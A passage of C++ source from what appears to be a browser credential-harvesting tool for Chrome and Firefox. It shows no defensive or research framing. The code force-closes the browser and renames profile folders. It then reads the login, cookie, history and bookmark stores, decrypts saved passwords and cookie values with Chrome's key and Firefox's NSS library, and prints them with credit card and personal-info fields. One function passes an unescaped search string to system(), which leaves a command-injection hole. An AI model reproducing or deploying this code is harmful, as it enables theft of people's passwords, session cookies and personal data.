#include "header/browser.h"
#include "header/firefox_decryptor.h"
#include "header/chrome_decryptor.h"

#include "header/utils.hpp"

// ------------------- BROWSING namespace -------------------------
// ------------------- BROWSING namespace -------------------------
// ------------------- BROWSING namespace -------------------------
// ------------------- BROWSING namespace -------------------------

using namespace Browsing;

/**
 * @brief Prepare an SQL file to be queried and work on it.
 *
 * This function opens an SQL file specified by the 'sqlDataBase' parameter and prepares it with
 * the provided 'query' statement.
 *
 * @param query A query to execute during the preparation of the SQL file. Will return results.
 * @param sqlDataBase A file path to an SQL file database.
 * @return A const SQL_BLOB which contains the sqlite3* database, an SQL statement, and an SQL exit code.
 * @see SQL_BLOB
 */
const SQL_BLOB Browsing::SQLPrepareAndQuery(const char* query, const char* sqlDataBase)
{
    sqlite3*       SQL_DATABASE             = nullptr;
    int            SQL_DATABASE_OPEN_RESULT = 0;
    sqlite3_stmt*  SQL_STATEMENT            = nullptr;
    int            SQL_PREPARE_RESULT       = 0;
    SQL_BLOB       SQL_DATABASE_COMPONENTS  = { SQLITE_ERROR, nullptr, nullptr };


    /* Check if sql database file exists */
    if (!utils::fs::exists(sqlDataBase))
        return SQL_DATABASE_COMPONENTS;

    /*
        Successfully opened and prepared sql data base.
        SQL_DATABASE and SQL_STATEMENT are now loaded-
        and can returned with the SQL_BLOB aswell as the status code-
        SQLITE_OK to indicate the information is good.
     */
    if (
        (SQL_DATABASE_OPEN_RESULT = sqlite3_open(sqlDataBase, &SQL_DATABASE)) == SQLITE_OK &&
        (SQL_PREPARE_RESULT       = sqlite3_prepare_v2(SQL_DATABASE, query, -1, &SQL_STATEMENT, nullptr) == SQLITE_OK)
        )
    {
        SQL_DATABASE_COMPONENTS.db = SQL_DATABASE;
        SQL_DATABASE_COMPONENTS.stmt = SQL_STATEMENT;
        SQL_DATABASE_COMPONENTS.statusCode = SQLITE_OK;

        return SQL_DATABASE_COMPONENTS;
    }
    else
    {
        return SQL_DATABASE_COMPONENTS;
    }

}

/**
 * @brief Check the validity of browser-related paths.
 *
 * This function checks if the paths stored in a `BrowserInfo` struct, such as the cookie file path,
 * history file path, login data path, profile default path, and profiles path, exist on the local machine
 * and are valid.
 *
 * @param browserInfo A BrowserInfo struct present in the Browser class. Check paths from this struct.
 * @return True if all browser paths are valid; otherwise, false.
 * @see BrowserInfo
 */
bool Browsing::AreBrowserPathsValid(BrowserInfoStr& browserInfo)
{
    std::vector<std::string> paths = {
        browserInfo.fBookmarks,
        browserInfo.fCookieFile,
        browserInfo.fHistoryFile,
        browserInfo.fLocalState,
        browserInfo.fLoginData,
        browserInfo.pNetwork,
        browserInfo.pProfileDefault,
        browserInfo.pProfiles
    };

    for (std::string path : paths)
    {
        if (!std::filesystem::exists(path) && path != "exception")
            return false;
    }

    return true;
}

// -------------------- Browser Interface --------------------
// -------------------- Browser Interface --------------------
// -------------------- Browser Interface --------------------
// -------------------- Browser Interface --------------------



/**
 * @brief Convert a BrowserIdentifier enum value to its corresponding string representation.
 *
 * @param identifier The BrowserIdentifier enum value.
 * @return The string representation of the browser name.
 */
const BrowserName Browsing::IdentifierToName(BrowserIdentifier& identifier)
{
    try {
        return IdentifierNames.at(identifier);
    }
    catch (const std::out_of_range&) {
        return "NULL";
    }
}

/**
 * @brief Convert a browser name string to its corresponding BrowserIdentifier enum value.
 *
 * @param nameString The string representation of the browser name.
 * @return The BrowserIdentifier enum value. Returns -1 if the browser identifier wasn't found.
 */
const BrowserIdentifier Browsing::BrowserNameToIdentifier(BrowserName& nameString)
{
    for (auto& entry : IdentifierNames)
    {
        if (strcmp(entry.second, nameString) == 0)
            return entry.first;
    }

    return -1;
}

/**
 * @brief Update the total number of objects of a specified type.
 *
 * If 'objectType' isn't a BrowserEntity type, the function does nothing.
 *
 * @param objects An array of the objects to calculate and save the size.
 * @tparam objectArray The type of objects being counted.
 */
template<typename objectArray>
void Browser::UpdateTotalNumOfObjects(
    const browser_vector<objectArray>& objects
)
{
    int browserObjType = -1;

    auto typeIter = BrowserEntityObjToType.find(typeid(objects));
    if (typeIter != BrowserEntityObjToType.end())
        browserObjType = typeIter->second;

    switch (browserObjType)
    {

    /* The object is a browser cookie */
    case BrowserEntities::ENTITY_COOKIE:
        this->TotalCookies = objects.size();
        break;

    /* The object is a browser entry to make up the search history */
    case BrowserEntities::ENTITY_BROWSER_ENTRY:
        this->TotalHistoryEntries = objects.size();
        break;

    /* The object is a saved password */
    case BrowserEntities::ENTITY_PASSWORD:
        this->TotalPasswords = objects.size();
        break;

    /* The object is a saved bookmark */
    case BrowserEntities::ENTITY_BOOKMARK:
        this->TotalBookmarks = objects.size();
        break;

    /* The object is a chunk of sensitive info */
    case BrowserEntities::ENTITY_CREDENTIALS:
        this->TotalSavedSensitiveInfo = objects.size();
        break;

    /* Unknown object type. */
    default:
        break;
    }
}

/* Output all information about a saved cookie */
void BrowserEntities::Cookie::output()
{
    std::cout << "\nName: " << cookieName << "\n";
    std::cout << "Value: " << cookieValue << "\n";
    std::cout << "Host: " << cookieHost << "\n";
    std::cout << "Path: " << cookiePath << "\n";
}

/* Output all members of password struct */
void BrowserEntities::Password::output()
{
    std::cout << "\nWebsite: " << originURL << "\n";
    std::cout << "Action URL: " << actionURL << "\n";
    std::cout << "Username: " << usernameValue << "\n";
    std::cout << "Password: " << passwordValue << "\n";
}

/* Output all members of browsing entry struct */
void BrowserEntities::BrowsingEntry::output()
{
    std::cout << "\nID: " << id << "\n";
    std::cout << "URL: " << url << "\n";
    std::cout << "Title: " << title << "\n";
    std::cout << "Site Desc: " << description << "\n";
    std::cout << "Times Re-visited: " << visitCount << "\n";
}

/* 
  DEPRECATED

  Output a saved credit card

  DEPRECATED
*/
void BrowserEntities::CreditCard::output()
{
    std::cout << "\nCard Holder Full Name: " << holderFullName << "\n";
    std::cout << "Card Type: " << cardType << "\n";
    std::cout << "Card Number: " << cardNumber << "\n";
    std::cout << "Card Expiry Date: " << expiry << "\n";
    std::cout << "Linked Addresses: " << addresses << "\n";
}

/* Output information about a saved browser bookmark */
void BrowserEntities::Bookmark::output()
{
    std::cout << "\nBookmark Title: " << title << "\n";
    std::cout << "Saved Link: " << url << "\n";
    std::cout << "Bookmark ID: " << id << "\n";
    std::cout << "Bookmark FK: " << fk << "\n";
}

/* Output personal information saved */
void BrowserEntities::PersonalInfo::output()
{
    std::cout << "\nCountry: " << countryAbbreviated << "\n";
    std::cout << "Province/State: " << addressLevel1 << "\n";
    std::cout << "Postal Code: " << postalCode << "\n";
    std::cout << "City: " << addressLevel2 << "\n";
    std::cout << "Street Address: " << streetAddress << "\n";
    std::cout << "First Name: " << givenName << "\n";
    std::cout << "Middle Name: " << additionalName << "\n";
    std::cout << "Last Name: " << familyName << "\n";
    std::cout << "Full Name: " << fullName << "\n";
    std::cout << "Email: " << linkedEmail << "\n";
    std::cout << "Phone Number: " << phoneNumberNational << "\n";
    std::cout << "Organization: " << organization << "\n";
}

/**
 * @brief Close a specific browser application by its identifier.
 *
 * This function maps the current browser identifier to the EXE name of the browser
 * and terminates the browser process.
 *
 * @param browser The browser to close.
 * @tparam BrowserObject The type of the browser object.
 */
void Browser::CloseBrowser(BrowserIdentifier browserid)
{
    std::map<BrowserIdentifier, std::string> identifierToExe
    {
        { BrowserTypes::Browser_GoogleChrome, "chrome" },
        { BrowserTypes::Browser_Firefox, "firefox" },
    };

    if (browserid == -1) {
        std::cerr << "ERROR: Browser Identifiers Empty. Cannot Close Browser." << std::endl;
        throw browser_error("Browser Indentifiers Empty", browser_error::ERR_UNKNOWN);
    }

    try {
        std::string application = identifierToExe.at(browserid);
        std::string command = "";

        if (!application.empty())
        {

#ifdef _WIN32
            command = "taskkill /f /im " + application + ".exe >nul 2>nul";
#elif __linux__
            command = "pkill -f " + application;
#endif

            system(command.c_str());
            Sleep(200); // Wait for everything to close down. Like a double check
        }
    } catch (std::out_of_range& error) {
        std::cerr << "ERROR: Browser Identifier Invalid." << std::endl;
    }
}

/**
 * @brief Construct Browser Objects for each installed browser on the local machine.
 *
 * @return A std::vector of Browser objects representing installed browsers.
 */
browser_vector<Browser*> Browsing::InstalledBrowsersToObject()
{
    std::vector<BrowserIdentifier> INSTALLED_BROWSERS = {};
    browser_vector<Browser*> BROWSER_OBJECTS = {};

    INSTALLED_BROWSERS = GetInstalledBrowsers();

    for (BrowserIdentifier& identifier : INSTALLED_BROWSERS)
    {
        if (identifier == BrowserTypes::Browser_Firefox)
        {
            Browser* Firefox = new Mozilla;
            BROWSER_OBJECTS.push_back(Firefox);
        }
        else if (identifier = BrowserTypes::Browser_GoogleChrome)
        {
            Browser* Google = new Chrome;
            BROWSER_OBJECTS.push_back(Google);
        }
    }

    return BROWSER_OBJECTS;
}

/**
 * @brief Get a vector of browser identifiers of all browsers installed on the local machine.
 *
 * This function searches the registry (SOFTWARE\\Clients\\StartMenuInternet) to determine
 * which browsers are installed and returns their identifiers.
 *
 * @return A std::vector of BrowserIdentifier values indicating installed browsers.
 */
std::vector<BrowserIdentifier> Browsing::GetInstalledBrowsers()
{
    std::vector<std::wstring>      installedBrowserNames = {};
    std::vector<BrowserIdentifier> installedBrowsersId = {};
    std::string regKeyInstalledBrowsers = "SOFTWARE\\Clients\\StartMenuInternet";
    HKEY regKey = nullptr;

    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, regKeyInstalledBrowsers.c_str(), 0, KEY_READ, &regKey) == ERROR_SUCCESS)
    {
        DWORD   regKeyIndex = 0;
        wchar_t browserName[256];
        DWORD   browserNameSize = sizeof(browserName) / sizeof(browserName[0]);
        
        while (RegEnumKeyEx(regKey, regKeyIndex, browserName, &browserNameSize, NULL, NULL, NULL, NULL) == ERROR_SUCCESS)
        {
            regKeyIndex++;
            browserNameSize = sizeof(browserName) / sizeof(browserName[0]);
            installedBrowserNames.push_back(std::wstring(browserName));
        }

        RegCloseKey(regKey);

        for (std::wstring& browser : installedBrowserNames)
        {
            std::string browserStringFormat(browser.begin(), browser.end());
            
            if (browserStringFormat.find("Firefox") != std::string::npos)
            {
                if (std::find(installedBrowsersId.begin(), installedBrowsersId.end(), BrowserTypes::Browser_Firefox)
                    == std::end(installedBrowsersId)) // Browser_Firefox is not already in the vector
                {
                    installedBrowsersId.push_back(BrowserTypes::Browser_Firefox);
                }
            }
        
            if (browserStringFormat.find("Google") != std::string::npos)
            {
                if (std::find(installedBrowsersId.begin(), installedBrowsersId.end(), BrowserTypes::Browser_GoogleChrome)
                    == std::end(installedBrowsersId)) // Browser_Chrome is not already in the vector
                {
                    installedBrowsersId.push_back(BrowserTypes::Browser_GoogleChrome);
                }
            }
        }
    }

    return installedBrowsersId;
}

void Browsing::DestroyBrowsers(browser_vector<Browser*> browsers) 
{
    //std::cout << "Destroying : " << browsers.size() << " Browsers." << std::endl;

    for (auto& browser : browsers) 
    {
        browser->Destroy();
    }
}



// -------------------- Google Chrome Browser --------------------
// -------------------- Google Chrome Browser --------------------
// -------------------- Google Chrome Browser --------------------
// -------------------- Google Chrome Browser --------------------

/**
 * @brief Constructor for the Google Chrome browser class.
 *
 * Sets up CurrentBrowserInfo with the needed info and creates vectors for Cookies and Passwords.
 */
Chrome::Chrome()
{
    /*
        Get Paths To Get Files and Fill in the Current Browser Info Struct
    */
    std::string chromePath = this->GetChromePath();
    std::string defaultProfileFolder  = chromePath + "/Default";
    std::string modifiedProfileFolder = chromePath + _MODIFIED_PROFILE_NAME;
    std::string networkFolder         = modifiedProfileFolder + "/Network";

    /*
        Set browser identifiers to identify which browser is being used by other functions
    */
    this->CurrentBrowserInfo->iBrowserIdentifier = BrowserTypes::Browser_GoogleChrome;
    this->CurrentBrowserInfo->sBrowserNameString = "Google Chrome";

    this->CloseBrowser(this->CurrentBrowserInfo->iBrowserIdentifier);

    utils::RenameFolder(defaultProfileFolder, modifiedProfileFolder, false);    

    /*
       Convert plain 'File' format to '.sqlite' to be read
       and to json formats
    */
    utils::ConvertOrCreateFile(modifiedProfileFolder, "Login Data", 2, ".sqlite");
    utils::ConvertOrCreateFile(networkFolder, "Cookies", 2, ".sqlite");
    utils::ConvertOrCreateFile(modifiedProfileFolder, "History", 2, ".sqlite");
    utils::ConvertOrCreateFile(modifiedProfileFolder, "Bookmarks", 1, ".json");

    // Browser Info
    this->CurrentBrowserInfo->fExeFile        = this->GetExePath();
    this->CurrentBrowserInfo->pProfiles       = chromePath.c_str();
    this->CurrentBrowserInfo->pProfileDefault = modifiedProfileFolder.c_str();
    this->CurrentBrowserInfo->pNetwork        = networkFolder.c_str();
    this->CurrentBrowserInfo->fLocalState     = chromePath + "/Local State";
    this->CurrentBrowserInfo->fLoginData      = modifiedProfileFolder + "/Login Data.sqlite";
    this->CurrentBrowserInfo->fCookieFile     = networkFolder + "/Cookies.sqlite";
    this->CurrentBrowserInfo->fHistoryFile    = modifiedProfileFolder + "/History.sqlite";
    this->CurrentBrowserInfo->fBookmarks      = modifiedProfileFolder + "/Bookmarks.json";

    /*
       Verify browser paths before continuing
    */
    if (AreBrowserPathsValid(*this->CurrentBrowserInfo))
        this->ArePathsValid = true;
    else {
        std::cerr << "ERROR: Browser Paths Invalid. One or More Paths in CuurrentBrowserInfo is Invalid." << std::endl;
        throw browser_error("Browser Paths Invalid", browser_error::ERR_INVALID_PATHS);
    }

    GCDecryptor Decryptor(this->CurrentBrowserInfo->fLocalState);
}

/**
 * @brief Destructor for the Google Chrome browser class.
 *
 * Resets the Default profile file and Login Data by renaming it to the default names and deletes allocated vectors of cookies and passwords.
 */
Chrome::~Chrome()
{
    std::string defaultProfileFolder  = this->CurrentBrowserInfo->pProfiles + "/Default";
    
    this->CloseBrowser(this->CurrentBrowserInfo->iBrowserIdentifier);

    /* Rename all files we worked on to their original name */
    utils::RenameFile(this->CurrentBrowserInfo->pProfileDefault, "/Login Data.sqlite", "/Login Data");
    utils::RenameFile(this->CurrentBrowserInfo->pNetwork, "/Cookies.sqlite", "/Cookies");
    utils::RenameFile(this->CurrentBrowserInfo->pProfileDefault, "/History.sqlite", "/History");
    utils::RenameFile(this->CurrentBrowserInfo->pProfileDefault, "/Bookmarks.json", "/Bookmarks");

    utils::RenameFolder(this->CurrentBrowserInfo->pProfileDefault, defaultProfileFolder);

    delete this->CurrentBrowserInfo;
}

void Chrome::Browse(std::string searchQuery) 
{
    std::string noWhitespaceQuery = searchQuery;
    for (int i = 0; i < searchQuery.size(); i++) {
        char c = searchQuery.at(i);
        char space = ' ';
        
        if (c == space) {
            // todo: replace space with + sigh
        }
    }

    std::string command = "\"" + this->CurrentBrowserInfo->fExeFile + "\" google.com/search?q" + noWhitespaceQuery;
    system(command.c_str());
}

std::string Chrome::GetChromePath()
{
#ifdef _WIN32
    std::string localAppData = "";
    std::string userData = "";

    localAppData = utils::GetFolder(CSIDL_LOCAL_APPDATA);
    userData = localAppData + "/Google/Chrome/User Data/";
    
    return userData;
#elif __linux__
    std::string directory = "";
    std::string home = "";
    
    home = std::getenv("HOME");
    directory = home + "/.config/google-chrome/";
    
    if (!std::filesystem::exists(directory))
        directory = home + "/.config/chromium/";

    return directory;
#endif
}

std::string Chrome::GetExePath()
{
    std::string programFiles = utils::GetFolder(CSIDL_PROGRAM_FILES);
    std::string chromePath = programFiles + "\\Google\\Chrome\\Application\\";
    std::string exe = chromePath + "chrome.exe";
    return exe;
}

int Chrome::NumOfFoundObjects(BrowserEntities::BrowserEntitiesTypes objectType, bool printInfo)
{
    try {
        if (objectType != BrowserEntities::ENTITY_NONE)
        {
            if (printInfo)
                std::cout << "[" << this->CurrentBrowserInfo->sBrowserNameString <<
                "] : Total Saved Entities for Object Type (" << objectType << "): " << this->EntityTypeToCount.at(objectType).get();
        }
        else if (printInfo)
        {
            std::cout << "Saved Info for Browser (" << this->CurrentBrowserInfo->sBrowserNameString << ")" << "\n";
            std::cout << "Total Cookies : " << this->TotalCookies << "\n";
            std::cout << "Total Passwords : " << this->TotalPasswords << "\n";
            std::cout << "Total Browser Entries : " << this->TotalHistoryEntries << "\n";
            std::cout << "Total Bookmarks : " << this->TotalBookmarks << "\n";
            std::cout << "Total Credentials : " << this->TotalSavedSensitiveInfo << "\n";
            std::cout << std::endl;
        }
    }
    catch (std::out_of_range& err) {
        return -100;
    }

    return -200;
}

/**
 * @brief Retrieves everything searched up on the search engine, essentially getting all search history.
 ** @return A vector of browsing entries representing the history.
 */
browser_vector<BrowserEntities::BrowsingEntry> Chrome::GetBrowserHistory()
{
    sqlite3* sqlDB = nullptr;
    sqlite3_stmt* sqlSTMT = nullptr;
    SQL_BLOB sql = {};
    const char* sqlQuery = "";
    
    // File is empty
    if (utils::ReadFileIntoString(this->CurrentBrowserInfo->fHistoryFile, false).empty())
        return browser_vector<BrowserEntities::BrowsingEntry>();

    /* Open an query history table */
    sqlQuery = "SELECT id, url, title, visit_count FROM urls";        
    sql = Browsing::SQLPrepareAndQuery(sqlQuery, this->CurrentBrowserInfo->fHistoryFile.c_str());
    sql.validate();

    sqlDB = sql.db;
    sqlSTMT = sql.stmt;
        
    /* Iterate through history table */
    while (sqlite3_step(sqlSTMT) == SQLITE_ROW)
    {
        BrowserEntities::BrowsingEntry historyEntry;
        historyEntry.id = sqlite3_column_int64(sqlSTMT, 0);
        historyEntry.url = utils::GetSqliteTextColumnIfNotNull(sqlSTMT, 1);
        historyEntry.title = utils::GetSqliteTextColumnIfNotNull(sqlSTMT, 2);
        historyEntry.visitCount = sqlite3_column_int64(sqlSTMT, 3);
        
        historyEntry.valid = true;

        this->History.push_back(historyEntry);
    }

    sqlite3_finalize(sqlSTMT);
    sqlite3_close(sqlDB);

    this->UpdateTotalNumOfObjects(this->History);

    return this->History;
}

/**
 * @brief Retrieves browser cookies from the Google Chrome browser.
 *
 * @return Vector of the found browser cookies.
 */
browser_vector<BrowserEntities::Cookie> Chrome::GetBrowserCookies()
{
    sqlite3*      sqlDB = nullptr;
    sqlite3_stmt* sqlSTMT = nullptr;
    SQL_BLOB      sql = {};
    const char*   sqlQuery = "";
    
    /* Open and query cookie table */
    sqlQuery = "SELECT host_key, name, path, expires_utc, encrypted_value FROM cookies";
    sql = Browsing::SQLPrepareAndQuery(sqlQuery, this->CurrentBrowserInfo->fCookieFile.c_str());
    sql.validate();

    sqlDB = sql.db;
    sqlSTMT = sql.stmt;

    /* Iterate through cookies */
    while (sqlite3_step(sqlSTMT) == SQLITE_ROW)
    {
        BrowserEntities::Cookie cookie;
        cookie.cookieHost   = utils::GetSqliteTextColumnIfNotNull(sqlSTMT, 0);
        cookie.cookieName   = utils::GetSqliteTextColumnIfNotNull(sqlSTMT, 1);
        cookie.cookiePath   = utils::GetSqliteTextColumnIfNotNull(sqlSTMT, 2);
        cookie.cookieExpiry = sqlite3_column_int64(sqlSTMT, 3);

        unsigned char* encrypted_value = (unsigned char*)(sqlite3_column_blob(sqlSTMT, 4)); // encrypted val
        int encrypted_value_size    = sqlite3_column_bytes(sqlSTMT, 4);

        if (encrypted_value_size > 0)
        {
            std::vector<unsigned char> cipherText(encrypted_value, encrypted_value + encrypted_value_size);

            std::string decrypted = GCDecryptor::Decrypt(cipherText);
            cookie.cookieValue = decrypted.c_str();
        }

        cookie.valid = true;

        this->Cookies.push_back(cookie);
    }

    sqlite3_finalize(sqlSTMT);
    sqlite3_close(sqlDB);

    this->UpdateTotalNumOfObjects(this->Cookies);

    return this->Cookies;
}

/**
 * @brief Retrieves saved passwords from the Google Chrome browser.
 *
 * @return Vector of the found browser passwords.
 */
browser_vector<BrowserEntities::Password> Chrome::GetSavedPasswords()
{
    sqlite3*       sqlDB = nullptr;
    sqlite3_stmt*  sqlSTMT = nullptr;
    SQL_BLOB       sqlBlob = {};
    std::string    masterKey = "";
    const char*    sqlQuery = "";
    int            sqlPrepare = -1;

    sqlQuery = "SELECT password_value, origin_url, action_url, username_value FROM logins";
    sqlBlob = Browsing::SQLPrepareAndQuery(sqlQuery, this->CurrentBrowserInfo->fLoginData.c_str());
    sqlBlob.validate();

    sqlDB     = sqlBlob.db;
    sqlSTMT   = sqlBlob.stmt;

    while (sqlite3_step(sqlSTMT) == SQLITE_ROW)
    {
        BrowserEntities::Password password;
        
        password.originURL     = utils::GetSqliteTextColumnIfNotNull(sqlSTMT, 1);
        password.actionURL     = utils::GetSqliteTextColumnIfNotNull(sqlSTMT, 2);
        password.usernameValue = utils::GetSqliteTextColumnIfNotNull(sqlSTMT, 3);

        unsigned char* passwordBlob      = (unsigned char*)sqlite3_column_blob(sqlSTMT, 0);
        int            passwordBlobSize  = sqlite3_column_bytes(sqlSTMT, 0);

        if (passwordBlobSize > 0)
        {
            std::vector<unsigned char> cipherText(passwordBlob, passwordBlob + passwordBlobSize);
            std::string passwordDecrypted = GCDecryptor::Decrypt(cipherText);
            password.passwordValue = passwordDecrypted.c_str();
        }

        password.valid = true;

        this->Passwords.push_back(password);
    }

    sqlite3_finalize(sqlSTMT);
    sqlite3_close(sqlDB);

    this->UpdateTotalNumOfObjects(this->Passwords);

    return this->Passwords;
}

/**
 * @brief Retrieves browser bookmarks from the Google Chrome browser.
 *
 * @return Vector of the found browser bookmarks.
 */
browser_vector<BrowserEntities::Bookmark> Chrome::GetBrowserBookmarks()
{
    std::string fileContents = utils::ReadFileIntoString(this->CurrentBrowserInfo->fBookmarks, false);
    JSON jsonParsedContents = JSON::parse(fileContents);

    // Iterate through json parsed contents
    for (auto& field : jsonParsedContents)
    {
        // Find bookmark_bar key
        auto fieldIterator = field.find("bookmark_bar");
        if (fieldIterator != field.end())
        {
            // Iterate through bookmark_bar values
            for (auto& children : fieldIterator.value())
            {
                // Iterate through bookmarks
                for (auto& plainTextBookmark : children)
                {
                    if (plainTextBookmark.find("type") != plainTextBookmark.end() && plainTextBookmark.at("type") == "url")
                    {

                        // Found new bookmark
                        BrowserEntities::Bookmark objectBookmark;
                        
                        // Get id of bookmark as a string
                        std::string id = plainTextBookmark.value("id", "-1");
                        
                        objectBookmark.title = plainTextBookmark.value("name", "null");
                        objectBookmark.url = plainTextBookmark.value("url", "null");
                        objectBookmark.id = std::stoi(id);
                        objectBookmark.valid = true;

                        this->Bookmarks.push_back(objectBookmark);
                    }
                }
            }
        }
    }

    return this->Bookmarks;
}



// -------------------- Firefox Browser --------------------
// -------------------- Firefox Browser --------------------
// -------------------- Firefox Browser --------------------
// -------------------- Firefox Browser --------------------



/**
 * @brief Constructor for the Mozilla Firefox browser class.
 *
 * Setup the CurrentBrowserInfo struct with all information needed and copy the cookies.sqlite file from the default profile folder to the desktop.
 */
Mozilla::Mozilla()
{
    // identifiers
    CurrentBrowserInfo->iBrowserIdentifier = BrowserTypes::Browser_Firefox;
    CurrentBrowserInfo->sBrowserNameString = "Mozilla Firefox";

    std::string defaultReleaseFolder = this->GetDefaultProfileFolder();

    CurrentBrowserInfo->pProfiles = Mozilla::GetProfilesFolder();
    CurrentBrowserInfo->pProfileDefault = this->CurrentBrowserInfo->pProfiles + "/" + _MODIFIED_PROFILE_NAME;
    CurrentBrowserInfo->fLoginData = this->CurrentBrowserInfo->pProfileDefault + "/logins.json";
    CurrentBrowserInfo->fCookieFile = CurrentBrowserInfo->pProfileDefault + "/cookies.sqlite";
    CurrentBrowserInfo->fHistoryFile = CurrentBrowserInfo->pProfileDefault + "/places.sqlite";

    this->CloseBrowser(this->CurrentBrowserInfo->iBrowserIdentifier);

    utils::RenameFolder(defaultReleaseFolder, CurrentBrowserInfo->pProfileDefault);

    if (AreBrowserPathsValid(*this->CurrentBrowserInfo))
        this->ArePathsValid = true;
    else {
        std::cerr << "ERROR: Browser Paths Invalid. One or More Paths in CuurrentBrowserInfo is Invalid." << std::endl;
        throw browser_error("Browser Paths Invalid", browser_error::ERR_INVALID_PATHS);
    }
}

/**
 * @brief Destructor for the Mozilla Firefox browser class.
 *
 * Correctly deletes vectors of cookies and passwords.
 */
Mozilla::~Mozilla()
{
    std::string modifiedProfileFolder = this->CurrentBrowserInfo->pProfileDefault;
    std::string defaultReleaseFolder = this->GetDefaultProfileFolder();
    
    this->CloseBrowser(this->CurrentBrowserInfo->iBrowserIdentifier);  

    utils::RenameFolder(modifiedProfileFolder, defaultReleaseFolder);
    delete this->CurrentBrowserInfo;
}

/**
 * @brief Retrieves the default profile folder path for Firefox.
 *
 * @return The default profile folder path for Firefox. TRAILING BACKSLASH INCLUDED.
 */
std::string Mozilla::GetDefaultProfileFolder()
{
    std::string   profilesFolder = Mozilla::GetProfilesFolder();
    std::ifstream file;

#ifdef _WIN32
    file.open(profilesFolder + "/../profiles.ini"); // profiles.ini is not in the profiles directory, its in one directory before the profiles folder
#elif __linux__
    file.open(profilesFolder + "/profiles.ini");
#endif

    std::string line;
    std::string defaultProfile;
    std::string toFind = "Default=";

    while (std::getline(file, line))
    {
        int pos = line.find(toFind); // Start Position where the string is found
        if (pos != std::string::npos)
        {
            std::string profileName = line.substr(pos + toFind.length()); // with profiles// prefix
            std::string prefix = "Profiles/";

            int pos2 = profileName.find(prefix);
            std::string actualName = profileName.substr(pos2 + prefix.length());

            defaultProfile = profilesFolder + "/" + actualName;
            break;
        }
    }

    file.close();
    
    return defaultProfile;
}

std::string Mozilla::GetProfilesFolder()
{
    std::string appdata = "";
    std::string profilesFolder = "";

#ifdef _WIN32
    appdata = utils::GetFolder(CSIDL_APPDATA);
    profilesFolder = appdata + "/Mozilla/Firefox/Profiles/";

    if (!utils::fs::exists(profilesFolder)) {
        std::cerr << "ERROR: Mozilla Profiles Folder Doesn't Exist. Couldn't locate it." << std::endl;
        throw utils::fs::filesystem_error("Profiles Folder Doesn't Exist.", std::error_code());
    }
#elif __linux__
    profilesFolder = Mozilla::GetMozillaPath() + "/firefox/";

    if (!utils::fs::exists(profilesFolder)) {
        std::cerr << "ERROR: Mozilla Profiles Folder Doesn't Exist. Couldn't locate it." << std::endl;
        throw utils::fs::filesystem_error("Profiles Folder Doesn't Exist.", std::error_code());
    }
#endif

    return profilesFolder;
}

/**
 * @brief Not to be confused with the Firefox browser path located in local AppData. Useful to get DLL dependencies and the Mozilla install path.
 *
 * @return A string representing the Mozilla path found in Program Files.
 * TRAILING BACKSLASH INCLUDED
 */
std::string Mozilla::GetMozillaPath()
{
#ifdef _WIN32
    std::string programFiles;
    std::string mozillaFolder;
     
    programFiles = utils::GetFolder(CSIDL_PROGRAM_FILES);
    mozillaFolder = programFiles + "/Mozilla Firefox/";

    if (!utils::fs::exists(mozillaFolder))
    {
        programFiles = utils::GetFolder(CSIDL_PROGRAM_FILESX86);
        mozillaFolder = programFiles + "/Mozilla Firefox/";

        if (!utils::fs::exists(mozillaFolder)) {
            std::cerr << "ERROR: Mozilla Path Not Found." << std::endl;
            throw browser_error("Mozilla Path Not Found.", browser_error::ERR_INVALID_PATH);
        }
    }

    return mozillaFolder;
#elif __linux__
    const char* homeFolder = std::getenv("HOME");

    if (homeFolder == nullptr) {
        std::cerr << "ERROR: Home Path Not Found." << std::endl;
        throw utils::fs::filesystem_error("Home Path Not Found", std::error_code());
    }

    std::string mozillaFolder = homeFolder + std::string("/.mozilla/");

    if (!utils::fs::exists(mozillaFolder)) {
        std::cerr << "ERROR: Mozilla Path Not Found." << std::endl;
        throw utils::fs::filesystem_error("Mozilla Path Not Found.", std::error_code());
    }

    return mozillaFolder;
#endif // _WIN32
}

/**
 * @brief Retrieves browser cookies from the Mozilla Firefox browser.
 *
 * @return Vector of the found browser cookies.
 */
browser_vector<BrowserEntities::Cookie> Mozilla::GetBrowserCookies()
{
    const char*    sqlQuery = "SELECT name, value, host, path, expiry FROM moz_cookies";
    SQL_BLOB       sql      = Browsing::SQLPrepareAndQuery(sqlQuery, this->CurrentBrowserInfo->fCookieFile.c_str());
    sqlite3*       sqlDB    = nullptr;
    sqlite3_stmt*  sqlSTMT  = nullptr;

    sql.validate();

    sqlDB   = sql.db;
    sqlSTMT = sql.stmt;

    while (sqlite3_step(sqlSTMT) == SQLITE_ROW)
    {        
        BrowserEntities::Cookie currentCookie;
        currentCookie.cookieName    = utils::GetSqliteTextColumnIfNotNull(sqlSTMT, 0);
        currentCookie.cookieValue   = utils::GetSqliteTextColumnIfNotNull(sqlSTMT, 1);
        currentCookie.cookieHost    = utils::GetSqliteTextColumnIfNotNull(sqlSTMT, 2);
        currentCookie.cookiePath    = utils::GetSqliteTextColumnIfNotNull(sqlSTMT, 3);
        currentCookie.cookieExpiry  = sqlite3_column_int64(sqlSTMT, 5);
        currentCookie.valid = true;

        Cookies.push_back(currentCookie);
    }

    sqlite3_finalize(sqlSTMT);
    sqlite3_close(sqlDB);

    this->UpdateTotalNumOfObjects(this->Cookies);

    return this->Cookies;
}

/**
 * @brief Retrieves saved passwords from the Mozilla Firefox browser.
 *
 * @return Vector of the found browser passwords.
 */
browser_vector<BrowserEntities::Password> Mozilla::GetSavedPasswords()
{
    std::string contents = utils::ReadFileIntoString(this->CurrentBrowserInfo->fLoginData, false);
    JSON parsed = JSON::parse(contents);    
    JSON logins = parsed;

    if (parsed.find("logins") != parsed.end())
        logins = parsed.find("logins").value();

    FFDecrypt FFDecrypt;
    
    if (!_NSS::loaded)
        FFDecrypt.NSSLoad(this);
    
    /*
        Browse logins to fill in the password structs.
        Look for fields such as hostname, formSubmitUrl,
        encryptedUsername, and encryptedPassword.

        For encryptedUsername and encryptedPassword,
        decrypt them using the FFDecrypt class before
        storing it into the Password struct.
    */
    for (const auto& field : logins)
    {
        BrowserEntities::Password password;

        password.originURL = field.value("hostname", "null");
        password.actionURL = field.value("formSubmitURL", "null");

        if (field.find("encryptedUsername") != field.end())
        {
            std::string decryptedUsername = FFDecrypt.NSSDecrypt(field["encryptedUsername"]);
            password.usernameValue = decryptedUsername;
        }
        if (field.find("encryptedPassword") != field.end())
        {
            std::string decryptedPassword = FFDecrypt.NSSDecrypt(field["encryptedPassword"]);
